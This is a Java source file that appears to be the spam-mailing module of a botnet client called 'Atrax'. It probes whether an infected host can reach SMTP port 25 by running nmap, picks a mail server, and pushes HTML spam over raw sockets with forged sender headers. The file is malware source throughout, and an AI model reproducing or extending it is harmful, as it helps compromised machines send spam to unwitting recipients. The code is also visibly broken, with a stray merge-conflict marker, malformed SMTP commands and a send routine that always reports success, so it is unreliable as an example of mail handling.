/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Atrax.atrax_client_bot;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.text.DateFormat;
import java.util.Date;
import java.util.Locale;
/*****************************************
 * this class:
 *  is the class responsible for 
 *  creating the mail spam objects
 *  it's objects can also determine
 *  whether they can send the spam mails 
 *  or not.
 *  Includes the spam mail header format.
 * @author sindat
 *****************************************/
public class mailer {
    String mode;
    String smtpServer;
    
    public mailer(bot theBot) throws IOException {
        if (mailer.canSendSMTP("gmail-smtp-in.1.google.com")) {
            mode = "self";
            smtpServer = theBot.hostNetParams.hostFQDN;
        } else {
            theBot.hostNetParams.getDNSdata(theBot.publicIpAddr);
            String hostSMTPserver = theBot.hostNetParams.findSMTPserver(theBot.hostNetParams.hostDomainName);
            if (hostSMTPserver != null) {
                if (mailer.canSendSMTP(hostSMTPserver)) {
                    mode = "isp";
                    smtpServer = hostSMTPserver;
                } else {
                    mode = "filtered";
                    smtpServer = null;
                  }
            } else {
                mode = "filtered";
                smtpServer = null;
              }
        }
    }
    
    /****************************************
     * this is the key method of this class.
     * it checks whether the host can send 
     * out mail on port 25
     ****************************************/
    private static Boolean canSendSMTP(String smtpServer) throws IOException{
        return tools.runCmd("nmap -Pn " + smtpServer + " -p 25").contains("25/tcp open  smtp");
    }
    
    /*************************************
     * this method is is the
     * actual spam functionality
     * of this class. Runs if canSendSMTP
     * evaluates to TRUE.
<<<<<<< HEAD
     * @param smtpServer
     * @param port
     * @param subject
     * @param fromAddress
     * @param toAddress
     * @param body
     * @return 
     *************************************/
    
    public static Boolean spamMessages(String smtpServer, int port, String subject, String fromAddress, String toAddress, String body) {
        Socket smtpSocket = null;
        DataOutputStream socketOutputStream = null;
        DataInputStream socketInputStream = null;        
        Date theDate = new Date();
        DateFormat theDateFormat = DateFormat.getDateInstance(DateFormat.FULL, Locale.US);
        
        try {
            smtpSocket = new Socket(smtpServer, port);
            socketOutputStream = new DataOutputStream(smtpSocket.getOutputStream());
            socketInputStream = new DataInputStream(smtpSocket.getInputStream());
            if (smtpSocket != null && socketOutputStream != null && socketInputStream != null){
                try {
                    socketOutputStream.writeBytes("HELLO atrax\r\n");
                    socketOutputStream.writeBytes("MAIL From: <" + fromAddress + ">\r\n");
                    socketOutputStream.writeBytes("MAIL To: <" + toAddress + ">atrax\r\n");
                    socketOutputStream.writeBytes("DATA\r\n");
                    socketOutputStream.writeBytes("X-Mailer: Via Java\r\n");
                    socketOutputStream.writeBytes("Content-Type: text/html\r\n");
                    socketOutputStream.writeBytes("Date: " + theDateFormat.format(theDate) + "\r\n");
                    socketOutputStream.writeBytes("From: Me<" + fromAddress + ">\r\n");
                    socketOutputStream.writeBytes("To: <" + toAddress + ">\r\n");
                    socketOutputStream.writeBytes("Subject:" + subject + "\r\n");
                    socketOutputStream.writeBytes(body + "\r\n");
                    socketOutputStream.writeBytes("\r\n.\r\n");
                    socketOutputStream.writeBytes("QUIT\r\n");
                    // Send the mail off through the smtp socket
                    // check the reply of the server
                    String responseLine;
                    while ((responseLine = socketInputStream.readLine()) != null) {
                        if (responseLine.indexOf("OK") != 1)
                            break;
                    }
                } catch (Exception e) {
                        System.out.println("An error occured.Cannot send mail");
                  }
            }
        } catch (Exception e) {
            System.out.println("Given host: " + smtpServer + " UNKNOWN!");
          }
        return true;
    }
}
